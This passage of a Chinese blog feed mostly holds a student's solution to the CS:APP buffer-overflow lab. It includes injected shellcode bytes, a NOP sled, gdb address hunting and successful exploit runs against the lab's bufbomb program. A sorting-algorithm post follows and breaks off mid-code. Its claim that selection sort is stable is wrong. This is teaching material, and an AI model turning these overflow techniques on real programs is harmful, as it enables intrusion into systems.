shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./3.txt</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3 //攻击代码</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">a0 38 68 55 //test()函数的ebp栈底地址</span><br><span class="line">48 38 68 55 //buf缓冲区首地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 3.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Boom!: getbuf returned 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-Level4-Nitroglycerin-10-pts"><a href="#5-Level4-Nitroglycerin-10-pts" class="headerlink" title="5.Level4: Nitroglycerin (10 pts)"></a>5.Level4: Nitroglycerin (10 pts)</h1><p>For this level, we have gone theopposite direction, making the stack positions even less stable than they normallyare. Hence the name “nitroglycerin”—an explosive that is notoriouslyunstable.When you run BUFBOMB with the command line flag “-n,” it will run in“Nitro” mode. Rather than calling the function getbuf, the program calls aslightly different function getbufn:</p><p>题意解析：</p><p>最后一关的要求和上一关一致，不过需要加上-n参数运行bufbomb，此时会进入testn和getbufn函数而不是test和getbuf函数。</p><p>testn(),getbufn()源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KABOOM_BUFFER_SIZE 512</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">testn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbufn();</span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;KABOOM!: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbufn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[KABOOM_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>与3不同的是，这关会连续执行5次，且每一次test()函数的ebp地址会改变,然后buf缓冲区的大小变成了512，buf缓冲区的首地址在每次运行的时候也各不相同</p><p>看起来好像有点棘手，但实际上总空间大小是不变的进入buf缓冲区，还是顶掉返回地址，将返回地址设置成buf缓冲区的首地址，或者，buf缓冲区中间的某一个位置(因为buf缓冲区的首地址不确定了)，然后让其一直执行，直到缓冲区末尾，然后我们将攻击代码放置在某位，这样，就算每次开始执行的位置不同，最后也都能执行到攻击代码的位置。那么怎么使程序持续执行到缓冲区末尾呢?</p><p>nop指令可以帮我们做到这一点，其编码为0x90，所以我们将缓冲区的前面很长一部分都用0x90来填充，末尾部分填充攻击代码，这样就能达到要求了</p><p>攻击代码的功能和上一关是一样的，这里就不细说了，只是有一点，testn()函数的ebp地址不再固定，所以我们只能通过esp即栈顶指针加上testn()函数的空间大小来确定ebp的地址</p><p>查看testn()和getbufn()的汇编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function testn:</span><br><span class="line">   0x08048cce &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048ccf &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048cd1 &lt;+3&gt;:push   %ebx</span><br><span class="line">   0x08048cd2 &lt;+4&gt;:sub    $0x24,%esp</span><br><span class="line">   0x08048cd5 &lt;+7&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048cda &lt;+12&gt;:mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x08048cdd &lt;+15&gt;:call   0x8049244 &lt;getbufn&gt;</span><br><span class="line">   0x08048ce2 &lt;+20&gt;:mov    %eax,%ebx</span><br><span class="line">   0x08048ce4 &lt;+22&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048ce9 &lt;+27&gt;:mov    -0xc(%ebp),%edx</span><br><span class="line">   0x08048cec &lt;+30&gt;:cmp    %edx,%eax</span><br><span class="line">   0x08048cee &lt;+32&gt;:je     0x8048d06 &lt;testn+56&gt;</span><br><span class="line">   0x08048cf0 &lt;+34&gt;:movl   $0x804a460,0x4(%esp)</span><br><span class="line">   0x08048cf8 &lt;+42&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048cff &lt;+49&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048d04 &lt;+54&gt;:jmp    0x8048d4c &lt;testn+126&gt;</span><br><span class="line">   0x08048d06 &lt;+56&gt;:cmp    0x804d104,%ebx</span><br><span class="line">   0x08048d0c &lt;+62&gt;:jne    0x8048d34 &lt;testn+102&gt;</span><br><span class="line">   0x08048d0e &lt;+64&gt;:mov    %ebx,0x8(%esp)</span><br><span class="line">   0x08048d12 &lt;+68&gt;:movl   $0x804a48c,0x4(%esp)</span><br><span class="line">   0x08048d1a &lt;+76&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048d21 &lt;+83&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function getbufn:</span><br><span class="line">   0x08049244 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049245 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049247 &lt;+3&gt;:sub    $0x218,%esp</span><br><span class="line">   0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax</span><br><span class="line">   0x08049253 &lt;+15&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08049256 &lt;+18&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x0804925b &lt;+23&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049260 &lt;+28&gt;:leave  </span><br><span class="line">   0x08049261 &lt;+29&gt;:ret   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x08048cce &lt;+0&gt;:push   %ebp</span><br><span class="line">0x08048ccf &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">0x08048cd1 &lt;+3&gt;:push   %ebx</span><br><span class="line">0x08048cd2 &lt;+4&gt;:sub    $0x24,%esp</span><br></pre></td></tr></table></figure><p>这个地方我是存有疑惑的，因为我觉得ebp应该是esp+24得到，但实际上是esp+28，不太明白是怎么回事，看网上其他人的博客，这里也一笔带过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax</span><br></pre></td></tr></table></figure><p>这里可以知道缓冲区有520个字节加上ebp所占空间有524个字节，最后四个字节即return地址，填写buf缓冲区的地址</p><p>先搞攻击代码，和上一关类似，就ebp地址的获取方式不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x685c1d96,%eax ;将cookie传入</span><br><span class="line">lea 0x28(%esp),%ebp;获取ebp地址</span><br><span class="line">push $0x08048ce2 ;返回到test()函数</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>得到有效攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">8d 6c 24 28</span><br><span class="line">68 e2 8c 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure><p>接下来是找最大的buf缓冲区首地址，这样即使每次buf缓冲区首地址不同也能够通过nop到达缓冲区末尾的攻击代码</p><p>断点设在0x08049253,查看eax即是buf首地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax</span><br><span class="line">0x08049253 &lt;+15&gt;:mov    %eax,(%esp)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08049253</span><br><span class="line">Breakpoint 1 at 0x8049253</span><br><span class="line">(gdb) r -n -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -n -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$1 = 0x55683668</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$2 = 0x55683698</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$3 = 0x55683678</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$4 = 0x55683688</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:                    </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$5 = 0x55683688</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到5个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0x55683668</span><br><span class="line">$2 = 0x55683698</span><br><span class="line">$3 = 0x55683678</span><br><span class="line">$4 = 0x55683688</span><br><span class="line">$5 = 0x55683688</span><br></pre></td></tr></table></figure><p>将最大地址0x55683698作为目标地址即可</p><h4 id="答案及结果-2"><a href="#答案及结果-2" class="headerlink" title="答案及结果"></a>答案及结果</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">./4.txt</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 //509个字节</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">8d 6c 24 28</span><br><span class="line">68 e2 8c 04 08</span><br><span class="line">c3 //攻击代码15个字节，共524个字节</span><br><span class="line">98 36 68 55 //buf目标地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw -n &lt; 4.txt | ./bufbomb -n -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完结撒花 _(:3」∠❀)__菊花碎了一地</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0-查看cookie&quot;&gt;&lt;a href=&quot;#0-查看cookie&quot; class=&quot;headerlink&quot; title=&quot;0. 查看cookie&quot;&gt;&lt;/a&gt;&lt;strong&gt;0. 查看cookie&lt;/strong&gt;&lt;/h1&gt; &lt;figure class=&quot;highli</summary>
      
    
    
    
    <category term="课程作业" scheme="https://kallenblue.github.io/categories/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="湖南大学" scheme="https://kallenblue.github.io/tags/%E6%B9%96%E5%8D%97%E5%A4%A7%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>一篇博客解决常见的排序</title>
    <link href="https://kallenblue.github.io/2022/09/08/%E7%AE%97%E6%B3%95/%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F/"/>
    <id>https://kallenblue.github.io/2022/09/08/%E7%AE%97%E6%B3%95/%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F/</id>
    <published>2022-09-08T14:20:47.000Z</published>
    <updated>2022-09-13T01:58:39.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p><img src="https://img-blog.csdnimg.cn/493e3f19c18f4940a19041cc9ff75f56.gif#pic_center" alt="在这里插入图片描述"></p><p>遍历n次数组，如果当前数比后一个数大则将当前<br>数与后一个数交换位置，每遍历一次可排好一个数<br>的位置，直到n次，时间复杂度为O（N2），排序满足稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] bubbleSort(<span class="type">int</span>[] ints)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; ints.length-i; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[j];</span><br><span class="line">                <span class="keyword">if</span> (ints[j]&lt;ints[j-<span class="number">1</span>])&#123;</span><br><span class="line">                    ints[j] = ints[j-<span class="number">1</span>];</span><br><span class="line">                    ints[j-<span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BubbleSort</span>().bubbleSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p><img src="https://img-blog.csdnimg.cn/a60a023b7dee45209a255cbb569f5ffa.gif#pic_center" alt="在这里插入图片描述"></p><p>遍历数组，每一次遍历都会从当前位置之后寻找最小的数，并记录最小数的位置，然后将当前值和最小值交换，完整遍历后可以得到一个顺序列表，时间复杂度为O（N2），排序满足稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectionSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] selectionSort(<span class="type">int</span>[] ints)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">first</span> <span class="operator">=</span> ints[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> first;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt; ints.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ints[j]&lt;tmp)&#123;</span><br><span class="line">                    tmp = ints[j];</span><br><span class="line">                    index = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ints[i] = ints[index];</span><br><span class="line">            ints[index] = first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SelectionSort</span>().selectionSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p><img src="https://img-blog.csdnimg.cn/4f3f096c237b4d85b50e0e39fcc28b03.gif#pic_center" alt="在这里插入图片描述"></p><p>每次排序前先选择一个基准数，然后把比基准数小的放左边，比基准书大的放右边，具体方法是用两个指针，一个从左到右，一个从右到左，左指针找到比基准数大的数时，将左指针的数和右指针的数交换，然后右指针开始向左找比基准书小的数，找到后和左指针的数交换，直到两个指针相遇，此时数组被分成两个区域，再对这两个区域进行快排递归，直到所有数都排好为止<br>时间复杂度为O(nlogn),在最坏的情况下为O(N2),且不能保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 